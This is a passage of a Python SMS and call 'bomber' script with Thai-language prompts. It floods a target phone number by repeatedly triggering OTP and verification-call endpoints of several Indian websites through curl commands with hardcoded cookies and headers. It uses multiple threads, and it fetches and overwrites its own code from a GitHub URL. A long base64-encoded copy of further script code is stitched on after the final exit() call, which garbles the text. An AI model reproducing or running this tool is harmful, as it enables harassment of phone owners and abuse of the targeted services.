"cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
        return True
    elif lim == 104:
        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
        return rd.lower().strip().find('callmade') != -1
    elif lim == 106:
        rd = os.popen(
            'curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
        return rd.find("1") != -1
    return False


def remsp(num):
    num = num.replace(' ', '')
    num = num.replace('-', '')
    return num


def start(target, counter, delay, ch, cc):
    clr()
    banner()
    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1
    while success < (int(bombs)):
        os.system('clear')
        banner()
        try:
            api = random.choice(ch)
        except Exception:
            if cc == "91":
                print('ขออภัยครับAPIเสีย')
                input('Press Enter To Exit...')
                exit()
            else:
                if success > 0:
                    print(
                        '\n\n\t Im Sorry ApI...')
                    print(
                        '\nWe Are Working Too Hard To Increase The International Limit...')
                    input(
                        '\n หากต้องการติดต่อแอดมิน FB:ยลยุทธ์ วันชาติ ...\n\nPress Enter To Exit...')
                    os.system('rm *.xxx* > /dev/null 2>&1')
                    print('\n\n')
                    banner()
                    exit()
                else:
                    print('\n\n\tSorry Your Country is Not Supported...')
                    print(
                        '\t\tPlease Send A Mail To bosgarenathailna@gmail.com To Let Us Know...')
                    input('Press Enter To Exit...')
                    exit()
        print(random.choice(colors))
        print("==================================================================")
        print("                กำลังทำงาน !!               ")
        print("     กรุณารอความเร็วจะเกิดกับดาต้ามือถือของคุณ !!    ")
        print("==================================================================")
        print("             เบอร์           : +" + str(cc) + " ", target)
        print("             กำลังส่ง  : ", requested)
        print("             สำเร็จการส่ง    : ", success)
        print("             ส่งผิดพลาด         : ", failed)
        print("==================================================================")
        print("              อย่าปิดแอพนี้จนกว่าจะทำงานเสร็จ!!                ")
        print("              Scriptking SCK คนทำหำใหญ่ !!                ")
        print("==================================================================")
        try:
            result = getapi(target, api, cc)
        except Exception:
            result = False
        requested = requested + 1
        if result:
            success = success + 1
        else:
            failed = failed + 1
            while ch.count(api) > 0:
                ch.remove(api)
        time.sleep(float(delay))
        if requested % 3 == 0:
            checkinternet()
    print(W)
    print('\n\nBombing Completed..')
    os.system('rm *.xxx* > /dev/null 2>&1')
    banner()
    exit()


def update():
    stuff_to_update = ['bomber.py', '.version']
    for fl in stuff_to_update:
        dat = urllib.request.urlopen(
            "https://raw.githubusercontent.com/g-anonymous/Tbomd2/master/" + fl).read()
        file = open(fl, 'wb')
        file.write(dat)
        file.close()
    print('\n\t\t อัพเดทสคริปแล้ว !!!!')
    print('\tPlease Run The Script Again...')
    exit()


clr()
banner()
try:
    urllib.request.urlopen('https://www.google.com')
except Exception:
    print("ใช้เน็ตน่ะครับ!")
    print("\tPlease Connect To Internet To Continue...\n")
    input('Exiting....\n Press Enter To Continue....')
    exit()
print('\tChecking For Updates...')
ver = urllib.request.urlopen(
    "https://raw.githubusercontent.com/g-anonymous/Tbomd2/master/.version").read().decode('utf-8')
verl = ''
try:
    verl = open(".version", 'r').read()
except Exception:
    pass
if ver != verl:
    print('\n\t\tAn Update is Available....')
    print('\tStarting Update...')
    update()
print("Your Version is Up-To-Date")
print('\n\n\t\t\tStarting TBomb...\n\n')
try:
    noti = urllib.request.urlopen(
        "https://raw.githubusercontent.com/g-anonymous/Tbomd2/master/.notify").read().decode('utf-8')
    noti = noti.upper().strip()
    if len(noti) > 10:
        print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
except Exception:
    pass
while True:
    pn = ""
    cc = input("\t ใส่รหัสประเทศ (ตัวอย่าง +66) : ")
    if '+' in cc:
        tc = list(cc)
        tc.remove('+')
        cc = ''.join(tc)
        cc = cc.strip()
    pn = input("\t ใส่เบอร์ (ตัวอย่าง 997072075): +" + cc + " ")
    pn = remsp(pn)
    if len(cc) >= 4 or len(cc) < 1:
        print('\n\nInvalid Country Code..\n\t\tCountry Codes Are Generally 1-3 digits...\n')
        continue
    if len(pn) <= 6:
        print('\n\n ไม่พบเบอร์..\n')
        continue
    for cch in str(cc + pn):
        if not cch.isdigit():
            print('\n\nPhone Number Must Consist Of Numbers Only\n')
            continue
    break
type = 0
try:
    if sys.argv[1] == "call":
        type = 1
except Exception:
    type = 0
if type == 1:
    nm = int(input("ใส่ค่าที่ต้องการ (สูงสุด 15): "))
    if nm > 15:
        print("\t\t คุณเลือกแล้ว" + str(nm) +
              ".\n\tNormalizing Value To 15")
        nm = 15
    dl = float(input("เวลาการส่ง (แนะนำ 10วิ ) [Recommended 10 sec ] : "))
elif type == 0:
    if cc == "91":
        nm = int(input("กำหนดข้อความการส่ง (0 For Unlimited): "))
        dl = float(
            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
    else:
        nm = int(input("ข้อความที่ต้องการส่ง"))
        dl = float(
            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
maxlim = 0
if cc == "91":
    maxlim = 500
else:
    maxlim = 100
if nm > maxlim:
    print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
          str(maxlim) + ' SMS At Once...\n\n')
    print('Number Of SMS Has been Set To ' + str(maxlim))
    nm = maxlim
if not cc.strip() == "91":
    if type == 1:
        print(
            '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
        print()
        input('Press Enter To Exit....')
        print('\n\n')
        banner()
        exit()
    cnt = 0
    if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
        print('\n\n\tSeems Like You Have Given Wrong Inputs...')
        input('\n\t\tPress Enter To Exit...')
        banner()
        exit()
    ch = [0, 14, 15, 16]
    start(pn, nm, dl, ch, str(cc))
    exit()
ch = [i for i in range(17)]
cbomb = False
if pn.strip() == '' or dl <= 0 or nm < 0:
    print('\n\n\tSeems Like You Have Given Wrong Inputs...')
    input('\n\t\tPress Enter To Exit...')
    banner()
    exit()
if type == 1:
    print("NOTE: Call Bomb Might Not Work on DND Activated Numbers...\n")
    print("\n\tPlease Don't Overload Call Bomb So That Is Would Work For Longer Period Of Time...")
    cbomb = True
if cbomb:
    chl = [100, 101, 102, 103, 104, 105, 106]
    start(pn, nm, dl, chl, str(cc))
    exit()
if nm == 0:
    nt = int(input("\tNumber Of Threads(10 to 20) : "))
    if nt <= 0 or nt >= 30:
        print('\tTBomb Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
    print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
    t = [None] * nt
    print(random.choice(colors))
    print("\n\n==================================================================")
    print("                โปรแกรมกำลังทำงานอย่าออก !!               ")
    print("     กรุณารอมีผลต่อดาต้า !!    ")
    print("==================================================================")
    print("             รหัสประเทศ       : +66", pn)
    print("             เบอร์มือถือ   : ", nt)
    print("             ดีเลย์               : ", dl)
    print("==================================================================")
    print("         ใช้ไปอย่าบ่น !!                ")
    print("         คนทำหำใหญ่ !!                ")
    print("==================================================================")
    print(W)
    input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
    os.system('rm *.xxx* > /dev/null 2>&1')
    print("\n\nStarting Bomb....")
    for i in range(nt):
        t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
        t[i].daemon = True
        t[i].start()
    time.sleep(2)
    ci = 0
    while True:
        ci += 1
        l = count_inf
        print("    Total Number of Requests Sent : ", l)
        if int(l) > maxlim:
            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
                  str(maxlim) + ' SMS At Once...\n\n')
            input('Press Enter To Exit...')
            os.system('rm *xxx* > /dev/null 2>&1')
            banner()
            exit()
        time.sleep(1)
        if ci % 3 == 0:
            checkinternet()
else:
    start(pn, nm, dl, ch, '91')
    exit()mVxdWlyZWQgcGFja2FnZXMnKQogICAgZXhpdCgpCgpjb2xvcnM9WydcMDMzWzE7MzFtJywnXDAzM1sxOzMybScsJ1wwMzNbMTszM20nLCdcMDMzWzE7MzRtJywnXDAzM1sxOzM1bScsJ1wwMzNbMTszNm0nXQpXPSdcMDMzWzBtJwojIFRoZSBDcmVkaXQgRm9yIFRoaXMgQ29kZSBHb2VzIFRvIFNwZWVkWCBBbmQgQWxsIE90aGVyIENvbnRyaWJ1dG9ycyBMaXN0ZWQgQXQgaHR0cHM6Ly9naXRodWIuY29tL1RoZVNwZWVkWC9UQm9tYgojIElmIFlvdSBXYW5uYSBUYWtlIENyZWRpdHMgRm9yIFRoaXMgQ29kZSwgUGxlYXNlIExvb2sgWW91cnNlbGYgQWdhaW4KCmNvdW50cnlfY29kZXMgPSB7CiAgICAnOTMnOiAnQUYnLAogICAgJzM1NSc6ICdBTCcsCiAgICAnMjEzJzogJ0RaJywKICAgICczNzYnOiAnQUQnLAogICAgJzI0NCc6ICdBTycsCiAgICAnNjcyJzogJ0FRJywKICAgICc1NCc6ICdBUicsCiAgICAnMzc0JzogJ0FNJywKICAgICcyOTcnOiAnQVcnLAogICAgJzYxJzogJ0FVJywKICAgICc0Myc6ICdBVCcsCiAgICAnOTk0JzogJ0FaJywKICAgICc5NzMnOiAnQkgnLAogICAgJzg4MCc6ICdCRCcsCiAgICAnMzc1JzogJ0JZJywKICAgICczMic6ICdCRScsCiAgICAnNTAxJzogJ0JaJywKICAgICcyMjknOiAnQkonLAogICAgJzk3NSc6ICdCVCcsCiAgICAnNTkxJzogJ0JPJywKICAgICczODcnOiAnQkEnLAogICAgJzI2Nyc6ICdCVycsCiAgICAnNTUnOiAnQlInLAogICAgJzI0Nic6ICdJTycsCiAgICAnNjczJzogJ0JOJywKICAgICczNTknOiAnQkcnLAogICAgJzIyNic6ICdCRicsCiAgICAnMjU3JzogJ0JJJywKICAgICc4NTUnOiAnS0gnLAogICAgJzIzNyc6ICdDTScsCiAgICAnMjM4JzogJ0NWJywKICAgICcyMzYnOiAnQ0YnLAogICAgJzIzNSc6ICdURCcsCiAgICAnNTYnOiAnQ0wnLAogICAgJzg2JzogJ0NOJywKICAgICc1Nyc6ICdDTycsCiAgICAnMjY5JzogJ0tNJywKICAgICc2ODInOiAnQ0snLAogICAgJzUwNic6ICdDUicsCiAgICAnMzg1JzogJ0hSJywKICAgICc1Myc6ICdDVScsCiAgICAnNTk5JzogJ0FOJywKICAgICczNTcnOiAnQ1knLAogICAgJzQyMCc6ICdDWicsCiAgICAnMjQzJzogJ0NEJywKICAgICc0NSc6ICdESycsCiAgICAnMjUzJzogJ0RKJywKICAgICc2NzAnOiAnVEwnLAogICAgJzU5Myc6ICdFQycsCiAgICAnMjAnOiAnRUcnLAogICAgJzUwMyc6ICdTVicsCiAgICAnMjQwJzogJ0dRJywKICAgICcyOTEnOiAnRVInLAogICAgJzM3Mic6ICdFRScsCiAgICAnMjUxJzogJ0VUJywKICAgICc1MDAnOiAnRksnLAogICAgJzI5OCc6ICdGTycsCiAgICAnNjc5JzogJ0ZKJywKICAgICczNTgnOiAnRkknLAogICAgJzMzJzogJ0ZSJywKICAgICc2ODknOiAnUEYnLAogICAgJzI0MSc6ICdHQScsCiAgICAnMjIwJzogJ0dNJywKICAgICc5OTUnOiAnR0UnLAogICAgJzQ5JzogJ0RFJywKICAgICcyMzMnOiAnR0gnLAogICAgJzM1MCc6ICdHSScsCiAgICAnMzAnOiAnR1InLAogICAgJzI5OSc6ICdHTCcsCiAgICAnNTAyJzogJ0dUJywKICAgICcyMjQnOiAnR04nLAogICAgJzI0NSc6ICdHVycsCiAgICAnNTkyJzogJ0dZJywKICAgICc1MDknOiAnSFQnLAogICAgJzUwNCc6ICdITicsCiAgICAnODUyJzogJ0hLJywKICAgICczNic6ICdIVScsCiAgICAnMzU0JzogJ0lTJywKICAgICc5MSc6ICdJTicsCiAgICAnNjInOiAnSUQnLAogICAgJzk4JzogJ0lSJywKICAgICc5NjQnOiAnSVEnLAogICAgJzM1Myc6ICdJRScsCiAgICAnOTcyJzogJ0lMJywKICAgICczOSc6ICdJVCcsCiAgICAnMjI1JzogJ0NJJywKICAgICc4MSc6ICdKUCcsCiAgICAnOTYyJzogJ0pPJywKICAgICcyNTQnOiAnS0UnLAogICAgJzY4Nic6ICdLSScsCiAgICAnMzgzJzogJ1hLJywKICAgICc5NjUnOiAnS1cnLAogICAgJzk5Nic6ICdLRycsCiAgICAnODU2JzogJ0xBJywKICAgICczNzEnOiAnTFYnLAogICAgJzk2MSc6ICdMQicsCiAgICAnMjY2JzogJ0xTJywKICAgICcyMzEnOiAnTFInLAogICAgJzIxOCc6ICdMWScsCiAgICAnNDIzJzogJ0xJJywKICAgICczNzAnOiAnTFQnLAogICAgJzM1Mic6ICdMVScsCiAgICAnODUzJzogJ01PJywKICAgICczODknOiAnTUsnLAogICAgJzI2MSc6ICdNRycsCiAgICAnMjY1JzogJ01XJywKICAgICc2MCc6ICdNWScsCiAgICAnOTYwJzogJ01WJywKICAgICcyMjMnOiAnTUwnLAogICAgJzM1Nic6ICdNVCcsCiAgICAnNjkyJzogJ01IJywKICAgICcyMjInOiAnTVInLAogICAgJzIzMCc6ICdNVScsCiAgICAnMjYyJzogJ1JFJywKICAgICc1Mic6ICdNWCcsCiAgICAnNjkxJzogJ0ZNJywKICAgICczNzMnOiAnTUQnLAogICAgJzM3Nyc6ICdNQycsCiAgICAnOTc2JzogJ01OJywKICAgICczODInOiAnTUUnLAogICAgJzIxMic6ICdFSCcsCiAgICAnMjU4JzogJ01aJywKICAgICc5NSc6ICdNTScsCiAgICAnMjY0JzogJ05BJywKICAgICc2NzQnOiAnTlInLAogICAgJzk3Nyc6ICdOUCcsCiAgICAnMzEnOiAnTkwnLAogICAgJzY4Nyc6ICdOQycsCiAgICAnNjQnOiAnTlonLAogICAgJzUwNSc6ICdOSScsCiAgICAnMjI3JzogJ05FJywKICAgICcyMzQnOiAnTkcnLAogICAgJzY4Myc6ICdOVScsCiAgICAnODUwJzogJ0tQJywKICAgICc0Nyc6ICdTSicsCiAgICAnOTY4JzogJ09NJywKICAgICc5Mic6ICdQSycsCiAgICAnNjgwJzogJ1BXJywKICAgICc5NzAnOiAnUFMnLAogICAgJzUwNyc6ICdQQScsCiAgICAnNjc1JzogJ1BHJywKICAgICc1OTUnOiAnUFknLAogICAgJzUxJzogJ1BFJywKICAgICc2Myc6ICdQSCcsCiAgICAnNDgnOiAnUEwnLAogICAgJzM1MSc6ICdQVCcsCiAgICAnOTc0JzogJ1FBJywKICAgICcyNDInOiAnQ0cnLAogICAgJzQwJzogJ1JPJywKICAgICc3JzogJ1JVJywKICAgICcyNTAnOiAnUlcnLAogICAgJzU5MCc6ICdNRicsCiAgICAnMjkwJzogJ1NIJywKICAgICc1MDgnOiAnUE0nLAogICAgJzY4NSc6ICdXUycsCiAgICAnMzc4JzogJ1NNJywKICAgICcyMzknOiAnU1QnLAogICAgJzk2Nic6ICdTQScsCiAgICAnMjIxJzogJ1NOJywKICAgICczODEnOiAnUlMnLAogICAgJzI0OCc6ICdTQycsCiAgICAnMjMyJzogJ1NMJywKICAgICc2NSc6ICdTRycsCiAgICAnNDIxJzogJ1NLJywKICAgICczODYnOiAnU0knLAogICAgJzY3Nyc6ICdTQicsCiAgICAnMjUyJzogJ1NPJywKICAgICcyNyc6ICdaQScsCiAgICAnODInOiAnS1InLAogICAgJzIxMSc6ICdTUycsCiAgICAnMzQnOiAnRVMnLAogICAgJzk0JzogJ0xLJywKICAgICcyNDknOiAnU0QnLAogICAgJzU5Nyc6ICdTUicsCiAgICAnMjY4JzogJ1NaJywKICAgICc0Nic6ICdTRScsCiAgICAnNDEnOiAnQ0gnLAogICAgJzk2Myc6ICdTWScsCiAgICAnODg2JzogJ1RXJywKICAgICc5OTInOiAnVEonLAogICAgJzI1NSc6ICdUWicsCiAgICAnNjYnOiAnVEgnLAogICAgJzIyOCc6ICdURycsCiAgICAnNjkwJzogJ1RLJywKICAgICc2NzYnOiAnVE8nLAogICAgJzIxNic6ICdUTicsCiAgICAnOTAnOiAnVFInLAogICAgJzk5Myc6ICdUTScsCiAgICAnNjg4JzogJ1RWJywKICAgICcyNTYnOiAnVUcnLAogICAgJzM4MCc6ICdVQScsCiAgICAnOTcxJzogJ0FFJywKICAgICc0NCc6ICdHQicsCiAgICAnMSc6ICdVUycsCiAgICAnNTk4JzogJ1VZJywKICAgICc5OTgnOiAnVVonLAogICAgJzY3OCc6ICdWVScsCiAgICAnMzc5JzogJ1ZBJywKICAgICc1OCc6ICdWRScsCiAgICAnODQnOiAnVk4nLAogICAgJzY4MSc6ICdXRicsCiAgICAnOTY3JzogJ1lFJywKICAgICcyNjAnOiAnWk0nLAogICAgJzI2Myc6ICdaVycKfQoKCmRlZiBjbHIoKToKICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICBvcy5zeXN0ZW0oJ2NscycpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQpkZWYgYmFubmVyKCk6CiAgICAKICAgIGNscigpCiAgICBsb2dvPSIiIiAoKFNDSykpICAgICAgICAgICAgICAgICAgICAgICAgICAiIiIKICAgIHByaW50KHJhbmRvbS5jaG9pY2UoY29sb3JzKStsb2dvK1cpCiAgICBwcmludCgiXG4iKQoKCgpjb3VudF9pbmYgPSAwCgoKZGVmIGluZmluaXRlKHBuLCBkbCwgY2gsIG1heCk6CiAgICBnbG9iYWwgY291bnRfaW5mCiAgICB3aGlsZSBUcnVlOgogICAgICAgIHdoaWxlIG9zLnBhdGguZXhpc3RzKCdwcm9jLnh4eCcpOgogICAgICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICBvcy5zeXN0ZW0oJ3RvdWNoIHByb2MueHh4JykKICAgICAgICBhcGkgPSByYW5kb20uY2hvaWNlKGNoKQogICAgICAgIHRyeToKICAgICAgICAgICAgcmV0ID0gZ2V0YXBpKHBuLCBhcGksIDkxKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIHJldCA9IEZhbHNlCiAgICAgICAgaWYgbm90IHJldDoKICAgICAgICAgICAgd2hpbGUgY2guY291bnQoYXBpKSA+IDA6CiAgICAgICAgICAgICAgICBjaC5yZW1vdmUoYXBpKQogICAgICAgICAgICBjb250aW51ZQogICAgICAgIG9zLnN5c3RlbSgncm0gcHJvYy54eHggPi9kZXYvbnVsbCAyPiYxJykKICAgICAgICBjb3VudF9pbmYgKz0gMQogICAgICAgICMgb3Muc3lzdGVtKCdlY2hvIFNwZWVkWCA+PiBjb3VudC54eHgnKQogICAgICAgIHRpbWUuc2xlZXAoZmxvYXQoZGwpKQogICAgICAgIGlmIChjb3VudF9pbmYgPiBtYXhsaW0pOgogICAgICAgICAgICBleGl0KCkKCgpkZWYgY2hlY2tpbnRlcm5ldCgpOgogICAgcmVzID0gRmFsc2UKICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20nLCB2ZXJpZnk9VHJ1ZSkKICAgICAgICByZXMgPSBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICByZXMgPSBUcnVlCiAgICBpZiByZXM6CiAgICAgICAgcHJpbnQoIlxuXG5cdEl0IHNlZW1zIFRoYXQgWW91ciBJbnRlcm5ldCBTcGVlZCBpcyBTbG93IG9yIFlvdSBBcmUgVXNpbmcgUHJveGllcy4uLiIpCiAgICAgICAgcHJpbnQoJ1x0XHRUQm9tYiBXaWxsIFN0b3AgTm93Li4uXG5cbicpCiAgICAgICAgYmFubmVyKCkKICAgICAgICBleGl0KCkKCgpkZWYgZ2V0YXBpKHBuLCBsaW0sIGNjKToKICAgIGdsb2JhbCBjb3VudHJ5X2NvZGVzCiAgICBjYyA9IHN0cihjYykuc3RyaXAoKQogICAgY25uID0gY291bnRyeV9jb2Rlc1tjY10KICAgIGxpbSA9IGludChsaW0pCiAgICB1cmwgPSBbImh0dHBzOi8vd3d3Lm95b3Jvb21zLmNvbS9hcGkvcHdhL2dlbmVyYXRlb3RwP2NvdW50cnlfY29kZT0lMkIiICsKICAgICAgICAgICBzdHIoY2MpICsgIiZub2Q9NCZwaG9uZT0iICsgcG4sICJodHRwczovL2RpcmVjdC5kZWxoaXZlcnkuY29tL2RlbGhpdmVyeWRpcmVjdC9vcmRlci9nZW5lcmF0ZS1vdHA/cGhvbmVObz0iICsgcG4sICJodHRwczovL3NlY3VyZWRhcGkuY29uZmlybXRrdC5jb20vYXBpL3BsYXRmb3JtL3JlZ2lzdGVyP21vYmlsZU51bWJlcj0iICsgcG5dCiAgICB0cnk6CiAgICAgICAgaWYgbGltIDwgbGVuKHVybCk6CiAgICAgICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oc3RyKHVybFtsaW1dKSkKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCAodXJsbGliLmVycm9yLkhUVFBFcnJvciwgdXJsbGliLmVycm9yLlVSTEVycm9yKToKICAgICAgICByZXR1cm4gRmFsc2UKICAgIGlmIGxpbSA9PSAzOgogICAgICAgIG9zLnN5c3RlbSgnY3VybCAtcyAtWCBQT1NUIC1IICJIb3N0Om0ubmV0bWVkcy5jb20iIC1IICJjb250ZW50LWxlbmd0aDo3NiIgLUggImFjY2VwdDoqLyoiIC1IICJvcmlnaW46aHR0cHM6Ly9tLm5ldG1lZHMuY29tIiAtSCAieC1yZXF1ZXN0ZWQtd2l0aDpYTUxIdHRwUmVxdWVzdCIgLUggInNhdmUtZGF0YTpvbiIgLUggInVzZXItYWdlbnQ6TW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyB2aXZvIDE3MTgpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83NC4wLjM3MjkuMTU3IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiAtSCAiY29udGVudC10eXBlOmFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCIgLUggInJlZmVyZXI6aHR0cHM6Ly9tLm5ldG1lZHMuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4vIiAtSCAiYWNjZXB0LWVuY29kaW5nOmd6aXAsIGRlZmxhdGUsIGJyIiAtSCAiYWNjZXB0LWxhbmd1YWdlOmVuLUlOLGVuO3E9MC45LGVuLUdCO3E9MC44LGVuLVVTO3E9MC43LGhpO3E9MC42IiAtSCAiY29va2llOmNoZWNrbW9iaWxlbm8tcG9wdXA9cXVXcWZ1bkYiIC1IICJjb29raWU6c2VjdGlvbl9kYXRhX2lkcz0lN0IlMjJjYXJ0JTIyJTNBMTU1OTcyMTkxNCUyQyUyMmRpcmVjdG9yeS1kYXRhJTIyJTNBMTU1OTcyMTg1MyU3RCIgLUggImNvb2tpZTptYWdlLW1lc3NhZ2VzPSIgLUggImNvb2tpZTpfZ2F0X1VBLTYzOTEwNDQ0LTE9MSIgLUggImNvb2tpZTpfZ2FjX1VBLTYzOTEwNDQ0LTE9MS4xNTU5NzIxODY2LkNqd0tDQWp3ME4zbkJSQnZFaXdBSE13dk51WXZnR2NuWVNkQWllNV8wTUJrblhTWHhmcnRBUS1vdGp2cWRicl9NUHlBZjU2bUZxd1FUeG9DaEVVUUF2RF9Cd0UiIC1IICJjb29raWU6X2djbF9hdz1HQ0wuMTU1OTcyMTg2Ni5DandLQ0FqdzBOM25CUkJ2RWl3QUhNd3ZOdVl2Z0djbllTZEFpZTVfME1Ca25YU1h4ZnJ0QVEtb3RqdnFkYnJfTVB5QWY1Nm1GcXdRVHhvQ2hFVVFBdkRfQndFIiAtSCAiY29va2llOl9ubXN0cmFja2luZz18IHNtcyB8IEFEVy1DUEMtU2VhcmNoLU5NUy1CcmFuZC1PQyIgLUggImNvb2tpZTpfbm1zVVRNdHJhY2tpbmdzb3VyY2U9QURXLUNQQy1TZWFyY2gtTk1TLUJyYW5kLU9DJkFEVy1DUEMtU2VhcmNoLU5NUy1CcmFuZC1PQyZDUEMmQURXLUNQQy1TZWFyY2gtTk1TLUJyYW5kLU9DIiAtSCAiY29va2llOl9ubXNDYW1wYWlnbj1BRFctQ1BDLVNlYXJjaC1OTVMtQnJhbmQtT0MiIC1IICJjb29raWU6X25tc01lZGl1bT1DUEMiIC1IICJjb29raWU6X25tc1NvdXJjZT1BRFctQ1BDLVNlYXJjaC1OTVMtQnJhbmQtT0MiIC1IICJjb29raWU6X25tc0F0dHI9QURXLUNQQy1TZWFyY2gtTk1TLUJyYW5kLU9DIiAtSCAiY29va2llOnByaXZhdGVfY29udGVudF92ZXJzaW9uPWVlZjAxNmUyZjgyMjVmNjMxZDRhNmUxY2Y4Y2RmNGFjIiAtSCAiY29va2llOm1hZ2UtY2FjaGUtc2Vzc2lkPXRydWUiIC1IICJjb29raWU6bWFnZS1jYWNoZS1zdG9yYWdlLXNlY3Rpb24taW52YWxpZGF0aW9uPSU3QiU3RCIgLUggImNvb2tpZTptYWdlLWNhY2hlLXN0b3JhZ2U9JTdCJTdEIiAtSCAiY29va2llOmZvcm1fa2V5PVlHV3B3SGlDTjV1Z2xPdFkiIC1IICJjb29raWU6X2dpZD1HQTEuMy45MzIyNzc4MS4xNTU5NjQ3MjE4IiAtSCAiY29va2llOm1hZ2UtdHJhbnNsYXRpb24tZmlsZS12ZXJzaW9uPSU3QiU3RCIgLUggImNvb2tpZTptYWdlLXRyYW5zbGF0aW9uLXN0b3JhZ2U9JTdCJTdEIiAtSCAiY29va2llOl9nY2xfYXU9MS4xLjY1NjQ3MjM1My4xNTU5NjQ3MjE0IiAtSCAiY29va2llOlBIUFNFU1NJRD1iNWkzNnJnMDJsMmpnOWNpZWxtbTlmbDdjNiIgLUggImNvb2tpZTpjdG9fbHdpZD1lNTkxNzg0NC00ZjFiLTQ4ZjktYmY3NC1iMGJmZGQ1Yzc5Y2UiIC1IICJjb29raWU6YnNDb0lkPTM1NTg3MjAzMzkxMDAiIC1IICJjb29raWU6YnNVbD0wIiAtSCAiY29va2llOl9mYnA9ZmIuMS4xNTU4NzIwMzMyMTg1Ljc5OTA2ODA0MiIgLUggImNvb2tpZTpfZ2E9R0ExLjMuMTg1NDk3MDAxLjE1NTg3MjAzMzAiIC1kIFwncmVnaXN0ZXJfbW9iaWxlbm89JyArIHBuICsgJyZsb2dpbnR5cGU9T3RwJnVuaXFfaWRlbnR5PXF1V3FmdW5GJmZvcmdldF9wd2Q9TlwnICJodHRwczovL20ubmV0bWVkcy5jb20vc29jaWFsbG9naW4vcG9wdXAvbm1zZ2V0Y29kZS8iICA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gNDoKICAgICAgICBvcy5zeXN0ZW0oCiAgICAgICAgICAgICdjdXJsIC1zIC1YIFBPU1QgLUggIkhvc3Q6Y2xpZW50LWFwaS5nb29tby5jb20iIC1IICJvcmlnaW46aHR0cHM6Ly93d3cuZ29vbW8uY29tIiAtSCAiY2xpZW50Om0td2ViIiAtSCAieC1nb29tby1wbGF0Zm9ybTptV2ViIiAtSCAiZG50OjEiIC1IICJjb250ZW50LXR5cGU6YXBwbGljYXRpb24vanNvbiIgLUggImFjY2VwdDoqLyoiIC1IICJyZWZlcmVyOmh0dHBzOi8vd3d3Lmdvb21vLmNvbS9ob3RlbHMiIC1IICJhY2NlcHQtZW5jb2Rpbmc6Z3ppcCwgZGVmbGF0ZSwgYnIiIC1IICJhY2NlcHQtbGFuZ3VhZ2U6ZW4tVVMsZW47cT0wLjkiIC1kIFwneyJlbWFpbCI6ImZha2VlbWFpbEBnbWFpbC5jb20iLCJwaG9uZV9udW1iZXIiOiInICsgcG4gKyAnIiwiY291bnRyeV9jb2RlIjoiJyArIGNjICsgJyJ9XCcgImh0dHBzOi8vY2xpZW50LWFwaS5nb29tby5jb20vdjIvcGhvbmVfY29uZmlybWF0aW9uL3ZlcmlmeV91c2VyIiA+IC9kZXYvbnVsbCAyPiYxJykKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxpZiBsaW0gPT0gNToKICAgICAgICBvcy5zeXN0ZW0oJ2N1cmwgLXMgLVggUE9TVCAtSCAiQWNjZXB0OiovKiIgLUggIkFjY2VwdC1FbmNvZGluZzpnemlwLCBkZWZsYXRlLCBiciIgLUggIkFjY2VwdC1MYW5ndWFnZTplbi1VUyxlbjtxPTAuNSIgLUggIkNvbm5lY3Rpb246a2VlcC1hbGl2ZSIgLUggIkNvbnRlbnQtTGVuZ3RoOjM0IiAtSCAiQ29udGVudC1UeXBlOmFwcGxpY2F0aW9uL3gtd3d